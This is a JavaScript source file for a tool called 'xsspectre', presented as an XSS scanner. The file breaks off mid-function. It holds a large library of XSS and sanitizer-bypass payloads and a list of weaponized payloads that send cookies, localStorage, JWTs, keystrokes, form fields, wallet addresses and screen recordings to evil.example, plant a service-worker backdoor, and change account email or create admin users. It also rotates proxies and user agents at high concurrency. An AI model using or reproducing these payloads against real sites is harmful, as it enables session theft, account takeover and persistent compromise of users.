(() => {
  'use strict';
  const MANIFEST = Object.freeze({
    name: 'xsspectre',
    version: '1.0.0',
    description: 'xsspectre — unified XSS scanner with baseline false-positive filter, dual mode (scan / lowscan mobile), adaptive pool.',
    help: 'xsspectre help',
    author: 'MUNITOS',
    official: false,
    default: false,
    securityLevel: 'high',
    permissions: Object.freeze({
      storage: 'none',
      cookies: 'none',
      network: 'full',
      filesystem: 'none'
    }),
    commands: Object.freeze(['xsspectre']),
    dependencies: Object.freeze([]),
    entry: 'install'
  });

  const PKG = 'xsspectre';
  const VERSION = MANIFEST.version;
  const GLOBAL_KEY = '__munitos_pkg_xsspectre';

const PROFILES = Object.freeze({
    high: Object.freeze({ concurrent: 384, minConcurrent: 192, maxConcurrent: 768, maxFormsToTest: 200, mainTaskLimit: 384, label: 'HIGH-POWER' }),
    low: Object.freeze({ concurrent: 48, minConcurrent: 24, maxConcurrent: 192, maxFormsToTest: 80, mainTaskLimit: 48, label: 'LOW-POWER (mobile)' })
  });

  const DEFAULTS = Object.freeze({
    timeout: 5500,
    concurrent: 48,
    minConcurrent: 24,
    maxConcurrent: 192,
    adaptiveWorkers: true,
    retries: 1,
    alertWaitMs: 2000,
    confirmAlerts: true,
    maxFormsToTest: 80,
    mainTaskLimit: 48,
    badAiEnabled: true,
    superAiEnabled: true,
    cveAiEnabled: true,
    baselineEnabled: true
  });

  

  const COMMAND = Object.freeze({
    name: PKG,
    description: 'xsspectre — unified XSS scanner.',
    usage: `${PKG} [scan|lowscan|badai|superai|cveai|selftest|help|info|commands|manifest|policy|version]`,
    aliases: Object.freeze([]),
    kind: 'scanner'
  });

  const state = {
    api: null,
    installed: false,
    settings: { ...DEFAULTS },
    runtime: {
      visited: new Set(),
      baseline: null,
      stats: {
        requests: 0, success: 0, failures: 0, reflected: 0, verified: 0, forms: 0, payloads: 0,
        domSinks: 0, fpFiltered: 0, mirrorFiltered: 0, alertsFired: 0, paramsFound: 0,
        altDetections: 0, firewallAbsent: 0, encodingsTried: 0, encodingWins: 0,
        superHits: 0, badHits: 0, cveHits: 0,
        dynamicWorkers: DEFAULTS.concurrent, workerAdjustments: 0,
        payloadsSkipped: 0, tasksSkipped: 0
      },
      startedAt: 0,
      lastReport: null,
      winningEncodings: new Map(),
      activeProfile: 'low',
      surface: null
    }
  };

  const getApi = () => {
    if (!state.api) throw new Error('PACKAGE_BRIDGE_UNAVAILABLE');
    return state.api;
  };
  const line = (text, cls = 'output') => {
    const api = getApi();
    if (typeof api.line !== 'function') throw new Error('PACKAGE_BRIDGE_LINE_UNAVAILABLE');
    return api.line(String(text ?? ''), cls);
  };
  const spacer = () => {
    const api = getApi();
    if (typeof api.spacer !== 'function') throw new Error('PACKAGE_BRIDGE_SPACER_UNAVAILABLE');
    return api.spacer();
  };
  const sleep = ms => new Promise(r => setTimeout(r, ms));

  const makeStream = () => {
    const fallbackOut = [];
    let buffer = [];
    let flushScheduled = false;
    let hasAppend = false;
    try { hasAppend = typeof getApi().append === 'function'; } catch {}

    const scheduleFlush = () => {
      if (!hasAppend || flushScheduled) return;
      flushScheduled = true;
      queueMicrotask(() => {
        flushScheduled = false;
        if (buffer.length === 0) return;
        const batch = buffer.splice(0);
        try { Promise.resolve(getApi().append(batch)).catch(() => {}); } catch {}
      });
    };

    const add = (t, c = 'output') => {
      const ln = line(t, c);
      if (hasAppend) { buffer.push(ln); scheduleFlush(); }
      else fallbackOut.push(ln);
    };

    const flushAll = async () => {
      if (!hasAppend || buffer.length === 0) return;
      const batch = buffer.splice(0);
      try { await getApi().append(batch); } catch {}
    };

    const finish = async () => {
      await flushAll();
      return hasAppend ? [] : fallbackOut;
    };

    return { add, flushAll, finish, hasAppend };
  };

  const getFreeUserProxy = () => { try { return globalThis.__FreeUserProxy || null; } catch { return null; } };
  const prepareProxyList = async (force = false) => {
    const network = getFreeUserProxy()?.api?.proxy;
    if (!network) throw new Error('FreeUserProxy is not available.');
    if (force && typeof network.refresh === 'function') await network.refresh();
    if (typeof network.ready === 'function') await network.ready();
    const list = getFreeUserProxy()?.getWorkingProxies?.() || network.getWorkingProxies?.() || [];
    if (!Array.isArray(list) || !list.length) throw new Error('No working proxies available.');
    return list.slice();
  };
  const getNextProxy = (() => { let cursor = 0; return async () => { const list = await prepareProxyList(); const item = list[cursor % list.length]; cursor = (cursor + 1) % list.length; return item; }; })();
  const pickUA = () => { try { return getFreeUserProxy()?.getRandomUserAgent?.() || getFreeUserProxy()?.api?.userAgent?.random?.() || ''; } catch { return ''; } };
  const cmdSetProxy = async ({ args = [] } = {}) => {
    const value = args.join(' ').trim();
    const management = getFreeUserProxy()?.api?.management;
    if (!management) throw new Error('FreeUserProxy management API is not available.');
    if (!value || value === 'clear' || value === 'none') {
      const entries = await management.list();
      for (const entry of entries) await management.remove(entry.template);
      return true;
    }
    if (!value.includes('{url}')) throw new Error('template must contain {url}');
    await management.add('command', value);
    return true;
  };

  const applyProfile = (profileName) => {
    const p = PROFILES[profileName] || PROFILES.low;
    state.runtime.activeProfile = profileName;
    state.settings.concurrent = p.concurrent;
    state.settings.minConcurrent = p.minConcurrent;
    state.settings.maxConcurrent = p.maxConcurrent;
    state.settings.maxFormsToTest = p.maxFormsToTest;
    state.settings.mainTaskLimit = p.mainTaskLimit;
    return p;
  };

  const PAYLOAD_LIB = Object.freeze([
    { id: 'img-err', ctx: 'html', p: '<img src=x onerror=alert(1)>', note: 'classic img onerror bare' },
    { id: 'img-err-q', ctx: 'html', p: '<img src=x onerror="alert(1)">', note: 'img onerror double-quoted' },
    { id: 'img-err-qx', ctx: 'html', p: '<img src=x onerror="alert(\'XSS\')">', note: 'img onerror quoted string' },
    { id: 'img-err-bare-qx', ctx: 'html', p: '<img src=x onerror=alert("XSS")>', note: 'img bare assign quoted arg' },
    { id: 'img-err-call', ctx: 'html', p: '<img src=x onerror=alert.call(null,1)>', note: 'Function.call indirect invoke' },
    { id: 'img-err-self', ctx: 'html', p: '<img src=x onerror=self["alert"](1)>', note: 'self bracket notation' },
    { id: 'img-err-reflect', ctx: 'html', p: '<img src=x onerror=Reflect.apply(alert,null,[1])>', note: 'Reflect.apply vector' },
    { id: 'img-err-top', ctx: 'html', p: '<img src=x onerror=top["al"+"ert"](1)>', note: 'top concat invoke' },
    { id: 'img-err-window', ctx: 'html', p: '<img src=x onerror=window["alert"](1)>', note: 'window bracket invoke' },
    { id: 'svg-load', ctx: 'html', p: '<svg onload=alert(1)>', note: 'svg onload bare' },
    { id: 'svg-load-q', ctx: 'html', p: '<svg onload="alert(1)">', note: 'svg onload quoted' },
    { id: 'svg-load-qx', ctx: 'html', p: '<svg/onload=alert(\'XSS\')>', note: 'svg slash quoted string' },
    { id: 'svg-slash-multi', ctx: 'html', p: '<svg/onload=alert(1)////>', note: 'svg trailing slashes' },
    { id: 'svg-animate', ctx: 'html', p: '<svg><animate onbegin=alert(1) attributeName=x dur=1s>', note: 'svg animate onbegin' },
    { id: 'svg-set', ctx: 'html', p: '<svg><set attributeName=onmouseover to=alert(1)>', note: 'svg set attribute injection' },
    { id: 'svg-script-href', ctx: 'html', p: '<svg><script href=data:,alert(1) />', note: 'svg script href data uri' },
    { id: 'svg-use', ctx: 'html', p: '<svg><use href="data:image/svg+xml,<svg id=x xmlns=http://www.w3.org/2000/svg><script>alert(1)</script></svg>#x">', note: 'svg use data-uri' },
    { id: 'details-tog', ctx: 'html', p: '<details open ontoggle=alert(1)>', note: 'details ontoggle' },
    { id: 'details-q', ctx: 'html', p: '<details open ontoggle="alert(\'XSS\')">', note: 'details quoted string' },
    { id: 'video-src', ctx: 'html', p: '<video><source onerror=alert(1)>', note: 'video source error' },
    { id: 'video-src-q', ctx: 'html', p: '<video><source onerror="alert(\'XSS\')">', note: 'video source quoted' },
    { id: 'video-track', ctx: 'html', p: '<video><track src=x onerror=alert(1)>', note: 'video track onerror' },
    { id: 'audio-err', ctx: 'html', p: '<audio src=x onerror=alert(1)>', note: 'audio onerror' },
    { id: 'picture-src', ctx: 'html', p: '<picture><source srcset=x onerror=alert(1)></picture>', note: 'picture source onerror' },
    { id: 'iframe-src', ctx: 'html', p: '<iframe srcdoc="<img src=x onerror=alert(1)>">', note: 'iframe srcdoc nested' },
    { id: 'iframe-js', ctx: 'html', p: '<iframe src=javascript:alert(1)>', note: 'iframe src js scheme' },
    { id: 'marquee', ctx: 'html', p: '<marquee onstart=alert(1)>x</marquee>', note: 'marquee onstart' },
    { id: 'object-data', ctx: 'html', p: '<object data="javascript:alert(1)">', note: 'object data js' },
    { id: 'object-param', ctx: 'html', p: '<object data=x><param name=src value=javascript:alert(1)></object>', note: 'object + param javascript' },
    { id: 'embed-src', ctx: 'html', p: '<embed src="javascript:alert(1)">', note: 'embed src js' },
    { id: 'input-focus', ctx: 'html', p: '<input autofocus onfocus=alert(1)>', note: 'input autofocus' },
    { id: 'textarea-focus', ctx: 'html', p: '<textarea autofocus onfocus=alert(1)>', note: 'textarea autofocus' },
    { id: 'select-focus', ctx: 'html', p: '<select autofocus onfocus=alert(1)>', note: 'select autofocus' },
    { id: 'keygen-focus', ctx: 'html', p: '<keygen autofocus onfocus=alert(1)>', note: 'keygen legacy focus' },
    { id: 'body-onload', ctx: 'html', p: '<body onload=alert(1)>', note: 'body onload' },
    { id: 'form-action', ctx: 'html', p: '<form action=javascript:alert(1)><input type=submit>', note: 'form action js' },
    { id: 'isindex', ctx: 'html', p: '<isindex action=javascript:alert(1) type=image>', note: 'isindex legacy vector' },
    { id: 'anchor-ping', ctx: 'html', p: '<a href=javascript:alert(1) ping=//evil.example id=x>c</a>', note: 'anchor ping exfil' },
    { id: 'base-href', ctx: 'html', p: '<base href=//evil.example/><img src=x onerror=alert(1)>', note: 'base href hijack' },
    { id: 'meta-refresh', ctx: 'html', p: '<meta http-equiv=refresh content="0;url=javascript:alert(1)">', note: 'meta refresh' },
    { id: 'attr-break-d', ctx: 'attr-quoted', p: '"><img src=x onerror=alert(1)>', note: 'double-quote attribute break' },
    { id: 'attr-break-s', ctx: 'attr-quoted', p: "'><svg onload=alert(1)>", note: 'single-quote attribute break' },
    { id: 'attr-break-d-q', ctx: 'attr-quoted', p: '"><img src=x onerror="alert(\'XSS\')">', note: 'quoted break + quoted payload' },
    { id: 'attr-break-s-q', ctx: 'attr-quoted', p: "'><svg onload=\"alert('XSS')\">", note: 'single break + svg quoted' },
    { id: 'attr-break-backtick', ctx: 'attr-quoted', p: '`><img src=x onerror=alert(1)>', note: 'backtick attribute break' },
    { id: 'attr-auto', ctx: 'attr-unquoted', p: ' autofocus onfocus=alert(1) x=', note: 'autofocus inject' },
    { id: 'attr-hover', ctx: 'attr-unquoted', p: ' onmouseover=alert(1) x=', note: 'onmouseover inject' },
    { id: 'attr-slash', ctx: 'attr-unquoted', p: ' onpointerover=alert(1) x=', note: 'onpointerover inject' },
    { id: 'attr-auto-q', ctx: 'attr-unquoted', p: ' autofocus onfocus="alert(\'XSS\')" x=', note: 'autofocus quoted XSS' },
    { id: 'attr-anim', ctx: 'attr-unquoted', p: ' style=animation-name:x onanimationstart=alert(1) x=', note: 'CSS animation trigger' },
    { id: 'attr-transition', ctx: 'attr-unquoted', p: ' style=transition:all 1ms ontransitionend=alert(1) x=', note: 'CSS transition trigger' },
    { id: 'attr-pointer', ctx: 'attr-unquoted', p: ' onpointerdown=alert(1) x=', note: 'onpointerdown inject' },
    { id: 'js-break-s', ctx: 'js-string', p: "';alert(1);//", note: 'JS single string break' },
    { id: 'js-break-d', ctx: 'js-string', p: '";alert(1);//', note: 'JS double string break' },
    { id: 'js-break-t', ctx: 'js-string', p: '`;alert(1);//', note: 'JS template string break' },
    { id: 'js-break-sx', ctx: 'js-string', p: "';alert('XSS');//", note: 'JS single break string' },
    { id: 'js-break-dx', ctx: 'js-string', p: '";alert("XSS");//', note: 'JS double break string' },
    { id: 'js-break-nl', ctx: 'js-string', p: "';alert(1)//\n", note: 'JS single break newline' },
    { id: 'js-tpl', ctx: 'js', p: '${alert(1)}', note: 'template literal injection' },
    { id: 'js-script-close', ctx: 'js', p: '</script><img src=x onerror=alert(1)>', note: 'script close break' },
    { id: 'js-script-close-q', ctx: 'js', p: '</script><img src=x onerror="alert(\'XSS\')">', note: 'script close quoted' },
    { id: 'js-script-close-attr', ctx: 'js', p: '</script><svg onload=alert(1)>', note: 'script close svg' },
    { id: 'url-js', ctx: 'url-attr', p: 'javascript:alert(1)', note: 'javascript: scheme' },
    { id: 'url-js-q', ctx: 'url-attr', p: 'javascript:alert("XSS")', note: 'javascript: quoted' },
    { id: 'url-data', ctx: 'url-attr', p: 'data:text/html,<script>alert(1)</script>', note: 'data URI scheme' },
    { id: 'url-data-b64', ctx: 'url-attr', p: 'data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==', note: 'data URI base64' },
    { id: 'url-js-tab', ctx: 'url-attr', p: 'java\tscript:alert(1)', note: 'tab obfuscated scheme' },
    { id: 'url-js-nl', ctx: 'url-attr', p: 'java\nscript:alert(1)', note: 'newline obfuscated scheme' },
    { id: 'url-js-entity', ctx: 'url-attr', p: 'java&#115;cript:alert(1)', note: 'entity in scheme' },
    { id: 'url-js-hex', ctx: 'url-attr', p: 'java%0ascript:alert(1)', note: 'percent-encoded scheme' },
    { id: 'url-js-colon-entity', ctx: 'url-attr', p: 'javascript&colon;alert(1)', note: 'colon entity scheme' },
    { id: 'byp-entity', ctx: 'html', p: '<img src=x onerror=alert&#40;1&#41;>', note: 'HTML entity obfuscation' },
    { id: 'byp-entity-hex', ctx: 'html', p: '<img src=x onerror=alert&#x28;1&#x29;>', note: 'hex entity obfuscation' },
    { id: 'byp-concat', ctx: 'html', p: '<img src=x onerror=window["al"+"ert"](1)>', note: 'string concat obfuscation' },
    { id: 'byp-char', ctx: 'html', p: '<img src=x onerror=alert(String.fromCharCode(49))>', note: 'fromCharCode bypass' },
    { id: 'byp-atob', ctx: 'html', p: '<img src=x onerror=eval(atob("YWxlcnQoMSk="))>', note: 'base64 eval bypass' },
    { id: 'byp-atob-q', ctx: 'html', p: '<img src=x onerror="eval(atob(\'YWxlcnQoXFx4MjdYU1NcXHgyNyk=\'))">', note: 'base64 eval quoted XSS' },
    { id: 'byp-case', ctx: 'html', p: '<ScRiPt>alert(1)</sCrIpT>', note: 'mixed case bypass' },
    { id: 'byp-nested', ctx: 'html', p: '<scr<script>ipt>alert(1)</scr</script>ipt>', note: 'nested tag bypass' },
    { id: 'byp-svg-entity', ctx: 'html', p: '<svg><script>alert&#40;1&#41;</script></svg>', note: 'svg script entity bypass' },
    { id: 'byp-comment', ctx: 'html', p: '<!--<img src=x onerror=alert(1)>-->', note: 'html comment wrapper' },
    { id: 'byp-unicode', ctx: 'html', p: '<img src=x onerror=al\u0065rt(1)>', note: 'JS unicode escape in function name' },
    { id: 'byp-hexescape', ctx: 'html', p: '<img src=x onerror=\\u0061lert(1)>', note: 'backslash-unicode escape' },
    { id: 'byp-constructor', ctx: 'html', p: '<img src=x onerror=[].constructor.constructor("alert(1)")()>', note: 'Function constructor' },
    { id: 'byp-import', ctx: 'html', p: '<script>import("data:text/javascript,alert(1)")</script>', note: 'dynamic import' },
    { id: 'byp-decimal-href', ctx: 'html', p: '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>', note: 'all decimal entity scheme' },
    { id: 'mxss', ctx: 'html', p: '<math><mtext><table><mglyph><style></math><img src=x onerror=alert(1)>', note: 'mXSS mutation' },
    { id: 'mxss-ns', ctx: 'html', p: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', note: 'noscript mutation' },
    { id: 'mxss-form', ctx: 'html', p: '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>', note: 'mXSS form mutation' },
    { id: 'mxss-svg', ctx: 'html', p: '<svg></p><style><g title="</style><img src=x onerror=alert(1)>', note: 'svg-style mutation' },
    { id: 'mxss-nested-div', ctx: 'html', p: '<div><div></div></div><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', note: 'nested div depth bypass' },
    { id: 'polyglot', ctx: 'html', p: 'jaVasCript:/*-/*`/*\\`/*\'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e', note: 'polyglot universal' },
    { id: 'polyglot2', ctx: 'html', p: '\'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\\></|><script>alert(1)</script>', note: 'polyglot #2' },
    { id: 'polyglot3', ctx: 'html', p: '<svg></p><style><a id="</style><img src=1 onerror=alert(1)>">', note: 'polyglot svg-style #3' },
    { id: 'polyglot4', ctx: 'html', p: '"><img src=x onerror=alert(1)><svg onload=alert(1)>', note: 'polyglot double-tag' },
    { id: 'template-inject', ctx: 'html', p: '<template><img src=x onerror=alert(1)></template>', note: 'template element injection' },
    { id: 'slot-inject', ctx: 'html', p: '<slot><img src=x onerror=alert(1)></slot>', note: 'slot element injection' },
    { id: 'shadow-closed', ctx: 'html', p: '<div id=x><template shadowrootmode=open><img src=x onerror=alert(1)></template></div>', note: 'shadow root declarative' },
    { id: 'dialog-open', ctx: 'html', p: '<dialog open><img src=x onerror=alert(1)></dialog>', note: 'dialog open injection' },
    { id: 'popover-open', ctx: 'html', p: '<div popover=auto id=x></div><script>x.showPopover()</script>', note: 'popover API script' }
  ]);

  const BAD_AI_PAYLOADS = Object.freeze([
    { id: 'bad-cookie', p: '<img src=x onerror="fetch(\'https://evil.example/c?d=\'+encodeURIComponent(document.cookie))">', note: 'Cookie exfiltration', requires: 'any' },
    { id: 'bad-keylog', p: '<img src=x onerror="document.onkeypress=e=>fetch(\'https://evil.example/k?k=\'+e.key)">', note: 'Persistent keylogger', requires: 'login' },
    { id: 'bad-deface', p: '<img src=x onerror="document.body.innerHTML=\'<h1 style=color:red;text-align:center>PWNED</h1>\'">', note: 'Full page defacement', requires: 'any' },
    { id: 'bad-redirect', p: '<img src=x onerror="location.href=\'https://evil.example/phish\'">', note: 'Phishing redirect', requires: 'any' },
    { id: 'bad-storage', p: '<img src=x onerror="fetch(\'https://evil.example/s\',{method:\'POST\',body:JSON.stringify(localStorage)})">', note: 'localStorage exfiltration', requires: 'any' },
    { id: 'bad-form-grab', p: '<img src=x onerror="document.querySelectorAll(\'input\').forEach(i=>fetch(\'https://evil.example/f?n=\'+i.name+\'&v=\'+encodeURIComponent(i.value)))">', note: 'Live form-field harvesting', requires: 'login' },
    { id: 'bad-session-fix', p: '<img src=x onerror="document.cookie=\'admin=1;path=/\'">', note: 'Session cookie poisoning', requires: 'login' },
    { id: 'bad-dom-takeover', p: '<img src=x onerror="document.querySelectorAll(\'a\').forEach(a=>a.href=\'https://evil.example\')">', note: 'DOM-wide link hijack', requires: 'any' },
    { id: 'bad-history', p: '<img src=x onerror="history.replaceState(null,\'\',\'/phish\')">', note: 'URL bar spoofing', requires: 'any' },
    { id: 'bad-clipboard', p: '<img src=x onerror="navigator.clipboard.writeText(\'https://evil.example\')">', note: 'Clipboard hijack', requires: 'any' },
    { id: 'bad-websocket', p: '<img src=x onerror="new WebSocket(\'wss://evil.example/\').send(document.cookie)">', note: 'WebSocket exfiltration', requires: 'any' },
    { id: 'bad-iframe-inject', p: '<img src=x onerror="document.body.insertAdjacentHTML(\'beforeend\',\'<iframe src=https://evil.example style=position:fixed;top:0;left:0;width:100%;height:100%></iframe>\')">', note: 'Full-page iframe clickjacking', requires: 'any' },
    { id: 'bad-beacon', p: '<img src=x onerror="navigator.sendBeacon(\'https://evil.example/b\',document.cookie)">', note: 'sendBeacon exfil', requires: 'any' },
    { id: 'bad-service-worker-backdoor', p: '<img src=x onerror="navigator.serviceWorker.register(\'data:text/javascript,self.onfetch=e=>{e.respondWith(fetch(e.request).then(r=>r.text()).then(t=>new Response(t+\'<script>fetch(`https://evil.example/s?d=`+encodeURIComponent(document.cookie))<\\/script>\',{headers:{\'Content-Type\':\'text/html\'}})))}).catch(()=>{})">', note: 'Persistent Service Worker backdoor', requires: 'any' },
    { id: 'bad-session-hijack', p: '<img src=x onerror="(async()=>{for(let k in localStorage){await fetch(\'https://evil.example/ls?k=\'+k+\'&v=\'+encodeURIComponent(localStorage[k]))}})()">', note: 'Full localStorage async drain', requires: 'login' },
    { id: 'bad-screen-record', p: '<img src=x onerror="navigator.mediaDevices.getDisplayMedia().then(s=>{const r=new MediaRecorder(s);const c=[];r.ondataavailable=e=>c.push(e.data);r.onstop=()=>fetch(\'https://evil.example/rec\',{method:\'POST\',body:new Blob(c)});r.start();setTimeout(()=>r.stop(),15000)})">', note: 'Screen recording exfil attempt', requires: 'any' },
    { id: 'bad-fingerprint', p: '<img src=x onerror="fetch(\'https://evil.example/fp\',{method:\'POST\',body:JSON.stringify({ua:navigator.userAgent,lang:navigator.language,scr:screen.width+\'x\'+screen.height,tz:Intl.DateTimeFormat().resolvedOptions().timeZone,plat:navigator.platform,cpu:navigator.hardwareConcurrency})})">', note: 'Comprehensive browser fingerprint exfil', requires: 'any' },
    { id: 'bad-persist-cookie', p: '<img src=x onerror="document.cookie=\'tracker=stolen;max-age=31536000;path=/\'">', note: 'Persistent tracking cookie', requires: 'any' },
    { id: 'bad-crypto-steal', p: '<img src=x onerror="(async()=>{try{if(window.ethereum){const a=await ethereum.request({method:\'eth_accounts\'});fetch(\'https://evil.example/wallet\',{method:\'POST\',body:JSON.stringify(a)})}}catch(e){}})()">', note: 'Crypto wallet address theft', requires: 'any' },
    { id: 'bad-db-dump', p: '<img src=x onerror="(async()=>{for(let k in localStorage){try{const d=JSON.parse(localStorage[k]);fetch(\'https://evil.example/d\',{method:\'POST\',body:JSON.stringify(d)})}catch(e){}}})()">', note: 'Structured storage dump', requires: 'any' },
    { id: 'bad-xhr-steal', p: '<img src=x onerror="fetch(\'/api/profile\').then(r=>r.text()).then(t=>fetch(\'https://evil.example/api\',{method:\'POST\',body:t}))">', note: 'Same-origin API response theft', requires: 'login' },
    { id: 'bad-csrf-chain', p: '<img src=x onerror="fetch(\'/api/change-email\',{method:\'POST\',headers:{\'Content-Type\':\'application/json\'},body:JSON.stringify({email:\'attacker@evil.example\'})})">', note: 'CSRF-style account takeover chain', requires: 'login' },
    { id: 'bad-admin-action', p: '<img src=x onerror="fetch(\'/api/admin/create-user\',{method:\'POST\',body:\'name=hacker&role=admin\'})">', note: 'Privileged admin action replay', requires: 'login' },
    { id: 'bad-token-leak', p: '<img src=x onerror="fetch(\'https://evil.example/t?jwt=\'+encodeURIComponent(document.cookie.match(/jwt=[^;]+/)||\'\'))">', note: 'JWT token exfiltration', requires: 'login' },
    { id: 'bad-cache-poison', p: '<img src=x onerror="fetch(\'/\',{headers:{\'X-Forwarded-Host\':\'evil.example\'}})">', note: 'Web cache poisoning probe', requires: 'any' }
  ]);

  const CVE_AI_PAYLOADS = Object.freeze([
    { id: 'cve2024-45801', cve: 'CVE-2024-45801', p: '<div><div></div></div><math><mtext><table><mglyph><style><img src=x onerror=alert(1)>', note: 'DOMPurify nesting-depth bypass', framework: 'DOMPurify' },
    { id: 'cve2024-47875', cve: 'CVE-2024-47875', p: '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>', note: 'DOMPurify form-nesting mXSS', framework: 'DOMPurify' },
    { id: 'cve2020-11022', cve: 'CVE-2020-11022', p: '<option><style></option></select><img src=x onerror=alert(1)>', note: 'jQuery htmlPrefilter mXSS', framework: 'jQuery' },
    { id: 'cve2020-11023', cve: 'CVE-2020-11023', p: '<style><style/><img src=x onerror=alert(1)>', note: 'jQuery .html() mXSS', framework: 'jQuery' },
    { id: 'cve2025-23061', cve: 'CVE-2025-23061', p: '<math><mtext><table><mglyph><style><!--</style><img title="--><img src=1 onerror=alert(1)>">', note: 'DOMPurify comment mutation', framework: 'DOMPurify' },
    { id: 'cve2025-26791', cve: 'CVE-2025-26791', p: '<noscript><p title="</noscript><img src=x onerror=alert(1)>">', note: 'DOMPurify noscript mutation', framework: 'DOMPurify' },
    { id: 'cve2025-27109', cve: 'CVE-2025-27109', p: '<math><mtext><table><mglyph><style></math><img src=x onerror=alert(1)>', note: 'DOMPurify math mXSS', framework: 'DOMPurify' },
    { id: 'cve2025-31136', cve: 'CVE-2025-31136', p: '<svg><desc><![CDATA[</desc><img src=x onerror=alert(1)>]]></svg>', note: 'SVG desc CDATA mXSS', framework: 'DOMPurify' },
    { id: 'ng-template', cve: 'NG-TEMPLATE', p: '{{constructor.constructor(\'alert(1)\')()}}', note: 'AngularJS sandbox escape', framework: 'AngularJS' },
    { id: 'ng-ngsrc', cve: 'NG-NGSRC', p: '<div ng-app><img src=x ng-on-error="alert(1)">', note: 'AngularJS ng-on-error', framework: 'AngularJS' },
    { id: 'vue-template', cve: 'VUE-TEMPLATE', p: '{{constructor.constructor("alert(1)")()}}', note: 'Vue template expression injection', framework: 'Vue' },
    { id: 'vue-vhtml', cve: 'VUE-VHTML', p: '<div v-html="<img src=x onerror=alert(1)>"></div>', note: 'Vue v-html injection', framework: 'Vue' },
    { id: 'react-dsih', cve: 'REACT-DSIH', p: '{"__html":"<img src=x onerror=alert(1)>"}', note: 'React dangerouslySetInnerHTML', framework: 'React' },
    { id: 'alpine-x-init', cve: 'ALPINE-X-', p: '<div x-init="alert(1)"></div>', note: 'Alpine.js x-init', framework: 'Alpine.js' },
    { id: 'alpine-x-html', cve: 'ALPINE-XHTML', p: '<div x-html="<img src=x onerror=alert(1)>"></div>', note: 'Alpine.js x-html', framework: 'Alpine.js' },
    { id: 'svelte-html', cve: 'SVELTE-AT', p: '{@html "<img src=x onerror=alert(1)>"}', note: 'Svelte @html', framework: 'Svelte' },
    { id: 'solid-dsih', cve: 'SOLID-DSIH', p: '<div innerHTML="<img src=x onerror=alert(1)>"></div>', note: 'SolidJS innerHTML', framework: 'SolidJS' },
    { id: 'tt-bypass', cve: 'TT-BYPASS', p: '<img src=x onerror=eval(location.hash.slice(1))>#alert(1)', note: 'Trusted Types bypass via hash', framework: 'TrustedTypes' },
    { id: 'dom-clobber', cve: 'DOM-CLOBBER', p: '<form id=x><input name=action><form id=y><input name=action></form><script>y.action.click()</script>', note: 'DOM clobbering chain', framework: 'Generic' },
    { id: 'csp-jsonp', cve: 'CSP-JSONP', p: '<script src=/api/jsonp?callback=alert(1)//></script>', note: 'CSP bypass via JSONP', framework: 'Generic' },
    { id: 'importmap', cve: 'IMPORTMAP', p: '<script type=importmap>{"imports":{"x":"data:text/javascript,alert(1)"}}</script><script type=module>import "x"</script>', note: 'Import map hijack', framework: 'Generic' },
    { id: 'sw-register', cve: 'SW-REGISTER', p: '<script>navigator.serviceWorker.register("data:text/javascript,self.onfetch=e=>e.respondWith(new Response(alert(1)))")</script>', note: 'Service Worker data-uri', framework: 'Generic' },
    { id: 'spec-rules', cve: 'SPEC-RULES', p: '<script type=speculationrules>{"prerender":[{"source":"list","urls":["data:text/html,<script>alert(1)</script>"]}]}</script>', note: 'Speculation Rules prerender XSS', framework: 'Chrome' },
    { id: 'css-import-js', cve: 'CSS-URL-JS', p: '<style>@import "data:text/css,body{background:url(\'javascript:alert(1)\')}"</style>', note: 'CSS @import javascript:', framework: 'Generic' },
    { id: 'san-bypass', cve: 'SAN-BYPASS', p: '<a href="javas&#99;ript&colon;alert(1)">x</a>', note: 'Sanitizer entity+colon bypass', framework: 'Generic' },
    { id: 'webc-shadow', cve: 'WEBC-SHADOW', p: '<div><template shadowrootmode=open><img src=x onerror=alert(1)></template></div>', note: 'Declarative Shadow DOM', framework: 'WebComponents' }
  ]);

  const _workerMain = function () {
    'use strict';
    let PAYLOAD_LIB = [];
    let initialized = false;

    const DECODE_CACHE = new Map();
    const decodeVariants = payload => {
      if (DECODE_CACHE.has(payload)) return DECODE_CACHE.get(payload);
      const set = new Set([payload]);
      try { set.add(decodeURIComponent(payload)); } catch {}
      try { set.add(decodeURIComponent(decodeURIComponent(payload))); } catch {}
      try { set.add(decodeURIComponent(decodeURIComponent(decodeURIComponent(payload)))); } catch {}
      const v = Array.from(set);
      if (DECODE_CACHE.size > 5000) DECODE_CACHE.clear();
      DECODE_CACHE.set(payload, v);
      return v;
    };
    const detectContext = (responseText, payload) => {
      const idx = responseText.indexOf(payload);
      if (idx === -1) return null;
      const before = responseText.substring(Math.max(0, idx - 200), idx);
      const after = responseText.substring(idx + payload.length, idx + payload.length + 200);
      const lastOpen = before.lastIndexOf('<');
      const lastClose = before.lastIndexOf('>');
      if (/<script[^>]*>[\s\S]*$/i.test(before) && /^[\s\S]*<\/script>/i.test(after)) {
        const quote = before.match(/["'`]\s*$/);
        return quote ? 'js-string' : 'js';
      }
      if (/<style[^>]*>[\s\S]*$/i.test(before)) return 'css';
      if (/<!--[\s\S]*$/.test(before) && !/-->/.test(before)) return 'comment';
      if (/<textarea[^>]*>[\s\S]*$/i.test(before)) return 'textarea';
      if (/<title[^>]*>[\s\S]*$/i.test(before)) return 'title';
      if (lastOpen > lastClose) {
        const tail = before.substring(lastOpen);
        const attr = tail.match(/([a-zA-Z_:][-a-zA-Z0-9_:.]*)\s*=\s*("[^"]*|'[^']*|[^\s>]*)$/);
        if (attr) {
          const name = attr[1].toLowerCase();
          const value = attr[2];
          if (name.startsWith('on')) return 'event-attr';
          if (['href','src','action','formaction','data','poster','cite','background','srcset'].includes(name)) return 'url-attr';
          if (name === 'style') return 'style-attr';
          if (value.startsWith('"') || value.startsWith("'")) return 'attr-quoted';
          return 'attr-unquoted';
        }
        return 'tag-attr';
      }
      return 'html';
    };
    const analyzeReflection = (responseText, payload) => {
      const variants = decodeVariants(payload);
      let matched = null;
      for (const v of variants) { if (v && responseText.includes(v)) { matched = v; break; } }
